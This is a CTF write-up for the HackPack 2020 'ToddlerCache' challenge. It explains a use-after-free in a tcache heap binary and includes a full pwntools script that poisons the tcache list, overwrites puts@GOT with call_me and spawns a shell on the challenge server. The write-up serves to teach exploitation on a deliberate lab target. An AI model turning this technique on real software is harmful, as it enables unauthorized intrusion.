---
layout: post
title: HackPack CTF 2020 - ToddlerCache 
---

> Welcome to ToddlerCache (t-cache for short)
>
> nc cha.hackpack.club 41703
>
> Files: [repo][repo]

## Analysis

Binary info:

{% highlight shell_session %}
toddler_cache: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked,
interpreter ./glibc_, for GNU/Linux 3.2.0, BuildID[sha1]=8a818e222697b9ef5a06529650bc32282553f0bd, not stripped

Canary                        : ✓
NX                            : ✓
PIE                           : ✘
Fortify                       : ✘
RelRO                         : Partial
{% endhighlight %}

Executing binary shows us that we have abilities to create new records, write to them and free them.

{% highlight shell_session %}
Welcome parents, to the ToddlerCache (We're calling it t-cache for short and legal reasons)
This program is for you to record memories with your toddlers!
-- What would you like to do?
1.) New
2.) Write
3.) Free
4.) Quit
{% endhighlight %}

Decompiling binary shows that binary contains use-after-free vulnerability. We can free the chunk and then write to it.

To exploit this vulnerability we can malform tcache bin list by making one of the freed chunks point to the location that we want to overwrite.

{% highlight python %}
new()
free(0)
write(0, p64(exe.got["puts"]))
new()
{% endhighlight %}

We can that now that freed chunk points to puts in GOT section.

{% highlight shell_session %}
pwndbg> tcachebins
tcachebins
0x90 [  0]: 0x602020 ◂— ...
{% endhighlight %}

Allocating new chunk and writing to it address of `call_me` allows us to overwrite the address of `put@got` and spawn a shell.

{% highlight python %}
io.sendline("2")
io.recvuntil("> ")
io.sendline(str(2))
io.recvuntil("What would you like to write?\n")
io.send(p64(exe.functions["call_me"].address))

io.interactive()
{% endhighlight %}

## Full exploit 

{% highlight python %}
#!/usr/bin/env python3

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./toddler_cache')
libc = ELF("./libc-2.26.so")

host = args.HOST or 'cha.hackpack.club'
port = int(args.PORT or 41703)

def local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug(["/lib64/ld-linux-x86-64.so.2", exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process(["/lib64/ld-linux-x86-64.so.2", exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
continue
'''.format(**locals())


io = start()

def new():
    io.sendline("1")
    io.recvuntil("> > ")

def write(idx, data):
    io.sendline("2")
    io.recvuntil("> ")
    io.sendline(str(idx))
    io.recvuntil("What would you like to write?\n")
    io.send(data)
    io.recvuntil("> >")

def free(idx):
    io.sendline("3")
    io.recvuntil("> > ")
    io.sendline(str(idx))
    io.recvuntil("> >")

new()
free(0)
write(0, p64(exe.got["puts"]))
new()
new()

io.sendline("2")
io.recvuntil("> ")
io.sendline(str(2))
io.recvuntil("What would you like to write?\n")
io.send(p64(exe.functions["call_me"].address))

io.interactive()
{% endhighlight %}

[repo]: https://github.com/r0ck3tz/ctfs/tree/master/2020/hackpackctf/toddlercache
